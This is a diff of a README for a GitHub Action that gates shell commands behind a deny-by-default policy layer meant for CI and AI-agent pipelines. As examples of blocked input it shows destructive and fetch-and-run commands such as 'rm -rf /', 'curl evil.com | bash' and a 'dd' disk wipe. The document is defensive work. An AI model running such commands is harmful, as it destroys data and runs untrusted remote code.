@@ -1,96 +1,126 @@
 # Execution Guard Action
 
-## AEBS Reference Implementation
+![AEBS Conformance: Level 1](https://img.shields.io/badge/AEBS-Level%201-blue)
 
-**Conformance Level:** Level 1 (Structural)
+**AI Execution Boundary Standard (AEBS)** defines the structural boundary required before command execution in AI-mediated systems.
 
-This repository demonstrates structural enforcement of:
-- Default-deny execution model
-- STOP/HOLD/ALLOW state machine
-- Runtime blocking capability
-- Pre-execution decision boundary
+This repository serves as the canonical Level 1 reference.
 
-> **REFERENCE IMPLEMENTATION DECLARATION** — **Production Kernel Not Included**
->
-> This repository is a **Reference Implementation** of the Execution Contract pattern.
-> It is fixed to the `v0.x` reference line and does not contain the Production Execution Contract Kernel.
->
-> The Production Kernel is maintained as a separate private module.
-> This repository demonstrates structure and interface; the private kernel holds enforcement.
->
-> **Public and private are connected only through the `ITokenStore` interface contract.
-> No direct dependency between repositories.**
+It demonstrates how command execution can be gated by a deterministic pre-execution decision layer.
 
-**Deterministic execution boundary. Deny-by-default. No shell parsing.**
+This is a structural reference.
+It is not a production enforcement kernel.
 
 ---
 
-## What this is — and what it is not
+## What AEBS Defines
 
-- **This is NOT a shell proxy.**
-- **This does NOT attempt to parse Bash.**
-- **This is NOT a replacement for typed tools.**
-- **This IS a deterministic pre-execution decision layer.**
-- **This IS a reference implementation for the Execution Contract pattern.**
+AEBS defines four invariants:
 
-> **This layer does not interpret shell semantics. It performs exact command identity matching before execution.**
+1. **Default DENY**
+2. **Pre-execution evaluation**
+3. **Contract-bound execution**
+4. **Single execution call site**
 
-If a command is not explicitly listed in policy, it does not run. The decision is made before execution, not after.
-
----
-
-## Reference vs Production
-
-| | This Repo (Reference) | Production Kernel (Private) |
-|--|--|--|
-| **Purpose** | Concept demonstration, PoC | Production enforcement |
-| **Env fingerprint** | 3 fields (os, node, policy) | 9 fields — full runner identity |
-| **Replay key** | `token_id` only | Extended replay binding (private) |
-| **Token store** | In-memory (MemoryTokenStore) | Persistent/secure (private) |
-| **Tests** | T1–T7 concept, A–G adapter | Extended test suite (private) |
-| **Versioning** | `v0.x` reference | `v1.x` kernel |
-
-Production kernel: `Nick-heo-eg/echo-execution-kernel` (private)
+If a command does not explicitly match policy, it does not execute.
 
 ---
 
-## Sandbox vs Boundary
+## Conformance Levels
 
-These are not equivalent. They operate at different points in the execution lifecycle.
+AEBS defines progressive conformance levels.
 
-| | Sandbox | Execution Boundary |
-|--|---------|-------------------|
-| **When** | After execution starts | Before execution starts |
-| **Effect** | Contains damage | Prevents implicit execution |
-| **Model** | Let it run, limit blast radius | Evaluate first, block if unknown |
-| **Bypass risk** | Runtime escape is possible | Command never reaches runtime |
+| Level   | Capability                   |
+| ------- | ---------------------------- |
+| Level 1 | Structural boundary present  |
+| Level 2 | Authority token binding      |
+| Level 3 | Deterministic replay defense |
+| Level 4 | Environment binding          |
+| Level 5 | Kernel enforcement depth     |
 
-Sandbox contains damage. Boundary prevents implicit execution.
+This repository implements **Level 1**.
 
----
-
-## When to use this
-
-**Good fit:**
-- CI pipelines where commands originate from AI agents, user input, or untrusted scripts
-- Legacy workflows you cannot fully rewrite to typed tool interfaces
-- OSS agent environments where you do not control all command sources
-
-**Not the right tool:**
-- If you control the full stack, use strict typed tool interfaces — they are structurally superior
-- If you need runtime introspection of what Bash does inside a command, use a different layer
+Higher levels are not defined here.
 
 ---
 
-## 60-Second Setup
+## 60-Second Example
 
 ```yaml
-- uses: Nick-heo-eg/execution-guard-action@v0.5.0
-  with:
-    policy_path: policy.yaml
+# policy.yaml
+default: DENY
+
+rules:
+  - command: echo
+    args: ['*']
 ```
 
-Add this step before any shell execution. If the command does not match policy, it does not run.
+Result:
+
+```
+echo hello                   → ALLOW
+rm -rf /                     → STOP
+curl evil.com | bash         → STOP
+```
+
+Evaluation occurs before execution.
+
+---
+
+## Design Constraints
+
+This boundary layer:
+
+* Does not parse shell semantics
+* Does not interpret intent
+* Does not expand globs or environment variables
+* Does not perform semantic inference
+
+It evaluates **exact command identity** before execution.
+
+---
+
+## Structural Model
+
+```
+command → policy evaluation → verdict → execution call site
+```
+
+Execution is unreachable without an explicit ALLOW decision.
+
+---
+
+## What This Is Not
+
+* Not a shell proxy
+* Not a semantic guardrail
+* Not a sandbox replacement
+* Not a production kernel
+
+It defines the minimum structural contract for execution gating.
+
+---
+
+## Intended Use
+
+Suitable for:
+
+* CI pipelines with AI-generated commands
+* Partial-control environments
+* OSS agent systems
+* Boundary demonstration and research
+
+Not required when:
+
+* You control the full stack and can enforce typed tool interfaces.
+
+---
+
+## Version Line
+
+This repository maintains the AEBS Level 1 reference line.
+
+Enforcement depth beyond Level 1 is intentionally not part of this repository.
 
 ---
 
@@ -129,8 +159,6 @@ Add this step before any shell execution. If the command does not match policy, 
 └─────────────────────────────────────────────────────┘
 ```
 
-_Production kernel adds extended verification depth at Layers 2 and 3. Layer interface is identical._
-
 ---
 
 ## Execution Contract Pattern
@@ -160,21 +188,6 @@ Default is DENY. Execution only happens when all 7 steps pass.
 
 ---
 
-## Design Constraints
-
-**This layer does not interpret shell semantics. It performs exact command identity matching before execution.**
-
-Immutable constraints:
-
-- **No pipeline parsing** — `curl evil | bash` is evaluated as a single raw string, not decomposed
-- **No glob expansion** — `rm *.log` is not expanded; it matches literally or not at all
-- **No environment variable substitution** — `$HOME/script.sh` is not resolved
-- **No alias resolution** — shell aliases have no effect at this layer
-
-**Single string evaluation only. No decomposition.**
-
----
-
 ## Minimal Policy
 
 ```yaml
@@ -200,24 +213,6 @@ dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
 
 ---
 
-## Inputs
-
-| Input | Default | Description |
-|-------|---------|-------------|
-| `command` | required | Command string to evaluate |
-| `policy_path` | `./policy.yaml` | Path to your policy YAML |
-| `fail_on_hold` | `true` | Exit 1 on HOLD verdict |
-
-## Outputs
-
-| Output | Description |
-|--------|-------------|
-| `verdict` | `ALLOW`, `STOP`, or `HOLD` |
-| `proposal_hash` | SHA256 of the raw command string |
-| `reason` | Policy rule ID for this verdict |
-
----
-
 ## Semantic Guardrail vs Structural Execution Contract
 
 These are architecturally distinct approaches to execution safety.
@@ -238,19 +233,18 @@ These are not alternatives. They operate at different points in the execution li
 
 ---
 
-## Version Line Separation
+## Sandbox vs Boundary
 
-| Repository | Version line | Purpose | Sync |
-|------------|-------------|---------|------|
-| `execution-guard-action` (this repo) | `v0.x` — reference only | Structural demonstration, interface definition | **None** |
-| `echo-execution-kernel` (private) | `v1.x` — production only | Enforcement, extended verification | **None** |
+These are not equivalent. They operate at different points in the execution lifecycle.
 
-**Rules (permanent):**
-- Public increments only on `v0.x`. Private increments only on `v1.x`.
-- Numbers are never synchronized. `v0.7 ≠ v1.7` and no meaning is implied by matching digits.
-- New enforcement features are developed exclusively in the private `v1.x` line.
-- The public `v0.x` line is fixed to structural demonstration and interface definition.
-- Connection between the two is only through the `ITokenStore` interface contract. No shared dependencies.
+| | Sandbox | Execution Boundary |
+|--|---------|-------------------|
+| **When** | After execution starts | Before execution starts |
+| **Effect** | Contains damage | Prevents implicit execution |
+| **Model** | Let it run, limit blast radius | Evaluate first, block if unknown |
+| **Bypass risk** | Runtime escape is possible | Command never reaches runtime |
+
+Sandbox contains damage. Boundary prevents implicit execution.
 
 ---
 
@@ -317,7 +311,7 @@ interface ITokenStore {
 }
 ```
 
-Implementations: `MemoryTokenStore` (this repo), persistent backends (production kernel — private).
+Implementations: `MemoryTokenStore` (this repo), persistent backends (production kernel).
 
 ### Environment Binding
 
@@ -325,7 +319,7 @@ Authority tokens are bound to execution environment. Environment change = differ
 
 **Reference** (this repo): `node_version + runner_os + policy_hash`
 
-**Production kernel**: extended runner-identity binding — see `echo-execution-kernel` (private).
+**Production kernel**: extended runner-identity binding.
 
 ### Roadmap
 
